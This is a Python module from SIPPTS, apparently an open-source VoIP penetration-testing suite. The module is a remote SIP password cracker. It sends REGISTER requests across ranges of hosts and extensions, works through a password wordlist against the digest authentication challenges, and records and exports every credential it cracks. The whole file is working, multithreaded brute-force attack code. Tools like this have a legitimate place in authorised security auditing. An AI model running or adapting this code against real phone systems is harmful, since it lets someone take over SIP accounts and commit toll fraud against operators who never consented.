#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Jose Luis Verdeguer"
__version__ = "4.1"
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2024, SIPPTS"
__email__ = "pepeluxx@gmail.com"

import socket
import sys
import ssl
import re
import threading
import signal
import time

try:
    import cursor
except:
    pass

from .lib.functions import (
    create_message,
    close_sockets,
    parse_message,
    parse_digest,
    expand_targets,
    host_sort_key,
    bind_local_port,
    generate_random_string,
    calculateHash,
    format_time,
    open_log,
    write_results,
    RESULT_FIELDS,
    read_targets_file,
)
from .lib.color import Color
from .lib.logos import Logo
from itertools import product
from concurrent.futures import ThreadPoolExecutor


class SipRemoteCrack:
    def __init__(self):
        self.ojson = ""
        self.ocsv = ""
        self.ip = ""
        self.host = ""
        self.proxy = ""
        self.route = ""
        self.rport = "5060"
        self.proto = "UDP"
        self.exten = ""
        self.prefix = ""
        self.authuser = ""
        self.ext_len = ""
        self.domain = ""
        self.contact_domain = ""
        self.wordlist = ""
        self.ofile = ""
        self.file = ""
        self.effile = ""
        self.targets = []
        self.user_agent = "pplsip"
        self.threads = "100"
        self.verbose = 0
        self.nocolor = ""
        self.timeout = 5

        self.run = True

        self.ips = []
        self.extens = []

        self.totaltime = 0
        self.found = []
        self.line = ["-", "\\", "|", "/"]
        self.pos = 0

        self.c = Color()

    def register(self, ip, to_user, pwd):
        if self.run == True:
            try:
                if self.proto == "UDP":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except socket.error:
                print(f"{self.c.RED}Failed to create socket")
                print(self.c.WHITE)
                sys.exit(1)

            sock_ssl = None
            bind = "0.0.0.0"
            lport = bind_local_port(sock, bind)

            if lport == 0:
                sock.close()

                if self.verbose == 2:
                    print(f"{self.c.RED}\nFailed to bind a local port{self.c.WHITE}")
                return

            if self.proxy == "":
                host = (str(ip), int(self.rport))
            else:
                if self.proxy.find(":") > 0:
                    (proxy_ip, proxy_port) = self.proxy.split(":")
                else:
                    proxy_ip = self.proxy
                    proxy_port = "5060"

                host = (str(proxy_ip), int(proxy_port))

            if self.proxy != "":
                self.route = "<sip:%s;lr>" % self.proxy

            data = dict()

            domain = self.domain
            if domain == "":
                domain = ip

            msg = create_message(
                "REGISTER",
                "",
                self.contact_domain,
                to_user,
                "",
                domain,
                to_user,
                "",
                domain,
                self.proto,
                domain,
                self.user_agent,
                lport,
                "",
                "",
                "",
                "1",
                "",
                "",
                1,
                "",
                0,
                "",
                self.route,
                "",
                "",
                "",
                1,
            )

            if self.verbose == 1:
                print(
                    f"{self.c.BWHITE}[+] Sending to {ip}:{str(self.rport)}/{self.proto} ..."
                )
                print(f"{self.c.YELLOW}{msg}")

            try:
                sock.settimeout(self.timeout)

                if self.proto == "TCP":
                    sock.connect(host)

                if self.proto == "TLS":
                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    context.load_default_certs()

                    sock_ssl = context.wrap_socket(sock, server_hostname=str(host[0]))
                    sock_ssl.connect(host)
                    sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                else:
                    sock.sendto(bytes(msg[:8192], "utf-8"), host)

                rescode = "100"
                tries = 0

                while rescode[:1] == "1" and tries < 10:
                    tries += 1

                    # receive temporary code
                    if self.proto == "TLS":
                        resp = sock_ssl.recv(4096)
                    else:
                        (resp, addr) = sock.recvfrom(4096)

                    headers = parse_message(resp.decode())

                    if headers and headers["response_code"] != "":
                        response = "%s %s" % (
                            headers["response_code"],
                            headers["response_text"],
                        )
                        rescode = headers["response_code"]

                        if self.verbose == 2:
                            print(
                                f"{self.c.BWHITE}[-] Receiving from {ip}:{self.rport}/{self.proto} ..."
                            )
                            print(f"{self.c.GREEN}{resp.decode()}{self.c.WHITE}")
                    else:
                        # not a SIP response, stop waiting for a final code
                        break

                headers = parse_message(resp.decode())

                if headers and headers["response_code"] != "":
                    auth_header = ""
                    try:
                        auth_header = headers["auth"]
                    except:
                        pass

                    # Received the auth digest?
                    if auth_header != "":
                        method = "REGISTER"
                        auth = headers["auth"]
                        auth_type = headers["auth-type"]
                        callid = headers["callid"]
                        data["ua"] = headers["ua"]

                        headers = parse_digest(auth)

                        if self.authuser == "":
                            auth_user = to_user
                        else:
                            auth_user = self.authuser

                        realm = headers["realm"]
                        nonce = headers["nonce"]
                        uri = "sip:%s" % (domain)
                        algorithm = headers["algorithm"]
                        cnonce = headers["cnonce"]
                        nc = headers["nc"]
                        qop = headers["qop"]

                        if qop != "" and cnonce == "":
                            cnonce = generate_random_string(8, 8, "ascii")
                        if qop != "" and nc == "":
                            nc = "00000001"

                        response = calculateHash(
                            auth_user,
                            realm,
                            pwd,
                            method,
                            uri,
                            nonce,
                            algorithm,
                            cnonce,
                            nc,
                            qop,
                            0,
                            "",
                        )
                        digest = (
                            'Digest username="%s",realm="%s",nonce="%s",uri="%s",response="%s",algorithm=%s'
                            % (auth_user, realm, nonce, uri, response, algorithm)
                        )
                        if qop != "":
                            digest += ", qop=%s" % qop
                        if cnonce != "":
                            digest += ', cnonce="%s"' % cnonce
                        if nc != "":
                            digest += ", nc=%s" % nc

                        msg = create_message(
                            "REGISTER",
                            "",
                            self.contact_domain,
                            to_user,
                            "",
                            domain,
                            to_user,
                            "",
                            domain,
                            self.proto,
                            domain,
                            self.user_agent,
                            lport,
                            "",
                            callid,
                            "",
                            "1",
                            "",
                            digest,
                            auth_type,
                            "",
                            0,
                            "",
                            self.route,
                            "",
                            "",
                            "",
                            1,
                        )

                        if self.verbose == 1:
                            print(
                                f"{self.c.BWHITE}[+] Sending to {ip}:{str(self.rport)}/{self.proto} ..."
                            )
                            print(f"{self.c.YELLOW}{msg}")

                        if self.proto == "TLS":
                            sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                        else:
                            sock.sendto(bytes(msg[:8192], "utf-8"), host)

                        rescode = "100"
                        # a peer that keeps answering 1xx used to keep this loop going forever
                        tries = 0

                        while rescode[:1] == "1" and tries < 10:
                            tries += 1

                            # receive temporary code
                            if self.proto == "TLS":
                                resp = sock_ssl.recv(4096)
                            else:
                                resp = sock.recv(4096)

                            headers = parse_message(resp.decode())

                            if headers and headers["response_code"] != "":
                                response = "%s %s" % (
                                    headers["response_code"],
                                    headers["response_text"],
                                )
                                rescode = headers["response_code"]
                                if self.verbose == 1:
                                    print(
                                        f"{self.c.BWHITE}[+] Receiving from {ip}:{str(self.rport)} ..."
                                    )
                                    print(f"{self.c.GREEN}{resp.decode()}")

                                data["code"] = headers["response_code"]
                                data["text"] = headers["response_text"]

                return data
            except socket.timeout:
                print(f"{self.c.RED}\nSocket timeout error")
                if self.run == True:
                    sys.exit()
                else:
                    pass
            except:
                print(f"{self.c.RED}Socket error{self.c.WHITE}")
                if self.run == True:
                    sys.exit()
                else:
                    pass
            finally:
                close_sockets(sock, sock_ssl)

        return data

    def signal_handler(self, sig, frame):
        print(f"{self.c.BYELLOW}You pressed Ctrl+C!")
        print(f"{self.c.BWHITE}\nStopping siprcrack ...")
        print(self.c.WHITE)

        self.stop()

    def stop(self):
        self.run = False

        for t in threading.enumerate():
            if t.name != "MainThread":
                try:
                    t.join()
                except:
                    pass

    def start(self):
        # from sippts-gui it arrives as text and the comparison against 5060
        # below never matched, so -p TLS did not switch to the default 5061
        try:
            self.rport = int(self.rport)
        except (TypeError, ValueError):
            self.rport = 5060

        # from sippts-gui it arrives as text, and settimeout() then raised
        # TypeError inside a bare except: the module reported a socket error
        # that never happened
        try:
            self.timeout = int(self.timeout)
        except (TypeError, ValueError):
            self.timeout = 5

        # reset the stop flag: after a Ctrl+C the object kept it set, so from
        # sippts-gui (where the module instance is reused) every later run
        # did nothing at all
        self.run = True

        supported_protos = ["UDP", "TCP", "TLS"]

        self.proto = self.proto.upper()

        try:
            self.verbose = int(self.verbose)
        except:
            self.verbose = 0

        if self.nocolor == 1:
            self.c.ansy()

        # if rport is by default but we want to scan TLS protocol, use port 5061
        if self.rport == 5060 and self.proto == "TLS":
            self.rport = 5061

        # check protocol
        if self.proto not in supported_protos:
            print(f"{self.c.BRED}Protocol {self.proto} is not supported")
            print(self.c.WHITE)
            sys.exit()

        # create a list of IP addresses
        names = []

        if self.file != "":
            # targets from a file, in the ip:port/proto that 'scan -ot' writes
            (self.targets, errors) = read_targets_file(
                self.file, self.rport, self.proto
            )

            for error in errors:
                print(f"{self.c.BRED}{error}")
                print(self.c.WHITE)

            if self.targets == []:
                print(f"{self.c.BRED}No target to attack in {self.file}")
                print(self.c.WHITE)
                sys.exit()

            self.ips = [t[0] for t in self.targets]
        else:
            try:
                (self.ips, names) = expand_targets(self.ip)
            except ValueError as error:
                print(f"{self.c.BRED}{error}")
                print(self.c.WHITE)
                sys.exit()

            if self.ips == []:
                print(f"{self.c.BRED}No target to attack in {self.ip}")
                print(self.c.WHITE)
                sys.exit()

            self.targets = [(ip, self.rport, self.proto) for ip in self.ips]

        # when the target is a single host name, keep the name as SIP domain
        # (for a network or a range each host uses its own address, see register)
        if self.domain == "" and len(names) == 1 and len(self.ips) == 1:
            self.domain = names[0]

        logo = Logo("siprcrack", self.nocolor)
        logo.print()

        # create a list of extens
        self.extens = []

        # -e is optional now that -ef exists, so it can arrive empty
        if self.exten == None:
            self.exten = ""

        for p in self.exten.split(",") if self.exten != "" else []:
            p = p.strip()
            m = re.fullmatch(r"([0-9]+)-([0-9]+)", p)
            if m:
                for x in range(int(m.group(1)), int(m.group(2)) + 1):
                    if self.ext_len != "":
                        self.extens.append(str(x).zfill(int(self.ext_len)))
                    else:
                        self.extens.append(x)
            else:
                if self.ext_len != "":
                    self.extens.append(str(p).zfill(int(self.ext_len)))
                else:
                    self.extens.append(p)

        # extensions from a file, what 'exten -oe' writes: they are added to
        # whatever -e brought, respecting -el and -pr
        if self.effile != "":
            try:
                with open(self.effile) as fe:
                    for linea in fe:
                        linea = linea.strip()

                        if linea == "" or linea.startswith("#"):
                            continue

                        if self.ext_len != "":
                            linea = str(linea).zfill(int(self.ext_len))

                        if linea not in self.extens:
                            self.extens.append(linea)
            except OSError as error:
                print(f"{self.c.RED}Error reading {self.effile} ({error})")
                print(self.c.WHITE)
                sys.exit()

        if self.extens == []:
            print(f"{self.c.BRED}No extensions to attack")
            print(self.c.WHITE)
            sys.exit()

        signal.signal(signal.SIGINT, self.signal_handler)
        print(f"{self.c.BYELLOW}\nPress Ctrl+C to stop\n")
        print(self.c.WHITE)

        threads = list()
        t = threading.Thread(target=self.crack, daemon=True)
        threads.append(t)
        t.start()

        t.join()

    def crack(self):
        max_values = 100000

        # threads to use
        nthreads = int(self.threads)
        total = len(self.ips) * len(self.extens)
        if nthreads > total:
            nthreads = total
        if nthreads < 1:
            nthreads = 1

        if self.file != "":
            print(f"{self.c.BWHITE}[✓] Targets file: {self.c.GREEN}{self.file}")
        else:
            print(f"{self.c.BWHITE}[✓] IP/Network: {self.c.GREEN}{str(self.ip)}")
        if self.proxy != "":
            print(f"{self.c.BWHITE}[✓] Outbound Proxy: {self.c.GREEN}{self.proxy}")
        print(f"{self.c.BWHITE}[✓] Port: {self.c.GREEN}{self.rport}")
        if self.prefix != "":
            print(f"{self.c.BWHITE}[✓] Users prefix: {self.c.GREEN}{self.prefix}")
        if self.effile != "":
            print(f"{self.c.BWHITE}[✓] Extensions file: {self.c.GREEN}{self.effile}")
        if self.exten != "":
            print(f"{self.c.BWHITE}[✓] Exten range: {self.c.GREEN}{self.exten}")
        if self.authuser != "":
            print(f"{self.c.BWHITE}[✓] Auth User: {self.c.GREEN}{self.authuser}")
        print(f"{self.c.BWHITE}[✓] Protocol: {self.c.GREEN}{self.proto.upper()}")

        if (
            self.domain != ""
            and self.domain != str(self.ip)
            and self.domain != self.host
        ):
            print(f"{self.c.BWHITE}[✓] Customized Domain: {self.c.GREEN}{self.domain}")
        if self.contact_domain != "":
            print(
                f"{self.c.BWHITE}[✓] Customized Contact Domain: {self.c.GREEN}{self.contact_domain}"
            )
        if self.user_agent != "pplsip":
            print(
                f"{self.c.BWHITE}[✓] Customized User-Agent: {self.c.GREEN}{self.user_agent}"
            )

        print(f"{self.c.BWHITE}[✓] Total threads: {self.c.GREEN}{str(nthreads)}")
        print(f"{self.c.BWHITE}[✓] Wordlist: {self.c.GREEN}{self.wordlist}")
        print(self.c.WHITE)

        # the wordlist was opened inside the worker threads, so a wrong path
        # was swallowed by the executor and the run ended with 'Nothing found'
        # as if every password had been tried
        try:
            open(self.wordlist, "rb").close()
        except OSError as error:
            print(f"{self.c.RED}Error reading wordlist {self.wordlist} ({error})")
            print(self.c.WHITE)
            sys.exit()

        start = time.time()

        # one pass per (port, proto): the workers read self.rport and
        # self.proto many times, so they are only reassigned between passes,
        # with no threads alive
        grupos = dict()

        for (ip, port, proto) in self.targets:
            grupos.setdefault((port, proto), [])

            if ip not in grupos[(port, proto)]:
                grupos[(port, proto)].append(ip)

        for (port, proto), lista in grupos.items():
            if self.run == False:
                break

            self.rport = port
            self.proto = proto

            self.run_pass(lista, nthreads, max_values)

        end = time.time()
        self.totaltime = int(end - start)

        self.found.sort(key=host_sort_key)
        self.print()

    def run_pass(self, ips, nthreads, max_values):
        total = len(ips) * len(self.extens)
        values = product(ips, self.extens)
        values2 = []
        count = 0

        for i, val in enumerate(values):
            if self.run == True:
                if count < max_values:
                    values2.append(val)
                    count += 1

                try:
                    cursor.hide()
                except: 
                    pass
                if count == max_values or i + 1 == total:
                    try:
                        with ThreadPoolExecutor(max_workers=nthreads) as executor:
                            if self.run == True:
                                for i, val2 in enumerate(values2):
                                    val_ipaddr = val2[0]
                                    val_exten = val2[1]
                                    to_user = "%s%s" % (self.prefix, val_exten)

                                    executor.submit(self.scan_host, val_ipaddr, to_user)
                    except:
                        pass

                    values2.clear()
                    count = 0
                try:
                    cursor.show()
                except: 
                    pass

    def scan_host(self, ipaddr, to_user):
        data = dict()

        if self.run == True:
            with open(self.wordlist, "rb") as f:
                for pwd in f:
                    if self.run == True:
                        try:
                            # the candidate is used as it is in the wordlist:
                            # any character removed here is a password that can
                            # never be cracked
                            try:
                                pwd = pwd.decode("utf-8")
                            except UnicodeDecodeError:
                                pwd = pwd.decode("latin-1")

                            pwd = pwd.rstrip("\r\n")

                            if self.run == True:
                                try:
                                    self.pos += 1
                                    if self.pos > 3:
                                        self.pos = 0

                                    if self.contact_domain == "":
                                        self.contact_domain = "10.0.0.1"

                                    if self.authuser == "":
                                        auth_user = to_user
                                    else:
                                        auth_user = self.authuser

                                    data = self.register(ipaddr, to_user, pwd)

                                    str = f"{self.c.BYELLOW}[{self.line[self.pos]}] {self.c.BWHITE}Cracking {self.c.BYELLOW}{ipaddr}:{self.rport}/{self.proto}{self.c.BWHITE} => Exten/Pass: {self.c.BGREEN}{to_user}/{pwd}{self.c.BBLUE} - {data['code']} {data['text']}"
                                    print(str.ljust(200), end="\r")

                                    if data and data["code"] == "200":
                                        print(self.c.WHITE)
                                        print(
                                            f"Password for user {self.c.BBLUE}{auth_user}{self.c.WHITE} found: {self.c.BRED}{pwd}{self.c.WHITE}"
                                        )
                                        line = "%s###%s###%s###%s###%s" % (
                                            ipaddr,
                                            self.rport,
                                            self.proto,
                                            auth_user,
                                            pwd,
                                        )
                                        self.found.append(line)

                                        f.close()
                                        return
                                except:
                                    pass
                        except:
                            pwd = ""
                            pass

        print(self.c.WHITE)
        f.close()

    def print(self):
        iplen = len("IP address")
        polen = len("Port")
        prlen = len("Proto")
        uslen = len("User")
        pwlen = len("Password")

        for x in self.found:
            (ip, port, proto, user, pwd) = x.split("###")
            if len(ip) > iplen:
                iplen = len(ip)
            if len(port) > polen:
                polen = len(port)
            if len(proto) > prlen:
                prlen = len(proto)
            if len(user) > uslen:
                uslen = len(user)
            if len(pwd) > pwlen:
                pwlen = len(pwd)

        tlen = iplen + polen + prlen + uslen + pwlen + 14

        print(self.c.WHITE)
        print(
            f"{self.c.WHITE}+{'-' * (iplen + 2)}+{'-' * (polen + 2)}+{'-' * (prlen + 2)}+{'-' * (uslen + 2)}+{'-' * (pwlen + 2)}+"
        )

        print(
            f"{self.c.WHITE}| {self.c.BWHITE}{'IP address'.ljust(iplen)}{self.c.WHITE} | {self.c.BWHITE}{'Port'.ljust(polen)}{self.c.WHITE} | {self.c.BWHITE}{'Proto'.ljust(prlen)}{self.c.WHITE} | {self.c.BWHITE}{'User'.ljust(uslen)}{self.c.WHITE} | {self.c.BWHITE}{'Password'.ljust(pwlen)}{self.c.WHITE} |"
        )

        print(
            f"{self.c.WHITE}+{'-' * (iplen + 2)}+{'-' * (polen + 2)}+{'-' * (prlen + 2)}+{'-' * (uslen + 2)}+{'-' * (pwlen + 2)}+"
        )

        # rcrack had no way of saving anything: the result of a crack that can
        # take hours only existed in the terminal scrollback
        if self.ofile != "":
            f = open_log(self.ofile)

        if len(self.found) == 0:
            print(f"{self.c.WHITE}| {self.c.WHITE}{'Nothing found'.ljust(tlen - 2)} |")
        else:
            for x in self.found:
                (ip, port, proto, user, pwd) = x.split("###")

                print(
                    f"{self.c.WHITE}| {self.c.BGREEN}{ip.ljust(iplen)}{self.c.WHITE} | {self.c.BMAGENTA}{port.ljust(polen)}{self.c.WHITE} | {self.c.BYELLOW}{proto.ljust(prlen)}{self.c.WHITE} | {self.c.BCYAN}{user.ljust(uslen)}{self.c.WHITE} | {self.c.BRED}{pwd.ljust(pwlen)}{self.c.WHITE} |"
                )

                if self.ofile != "":
                    f.write("%s:%s/%s => %s/%s\n" % (ip, port, proto, user, pwd))

        if self.ofile != "":
            f.close()

        print(
            f"{self.c.WHITE}+{'-' * (iplen + 2)}+{'-' * (polen + 2)}+{'-' * (prlen + 2)}+{'-' * (uslen + 2)}+{'-' * (pwlen + 2)}+"
        )
        print(self.c.WHITE)

        print(
            f"{self.c.BWHITE}Time elapsed: {self.c.YELLOW}{str(format_time(self.totaltime))}{self.c.WHITE}"
        )
        print(self.c.WHITE)
        write_results(
            self.found,
            RESULT_FIELDS["rcrack"],
            "rcrack",
            jsonfile=self.ojson,
            csvfile=self.ocsv,
            meta={
                "target": self.ip,
                "port": self.rport,
                "proto": self.proto,
                "extens": self.exten,
                "wordlist": self.wordlist,
                "elapsed": self.totaltime,
            },
        )

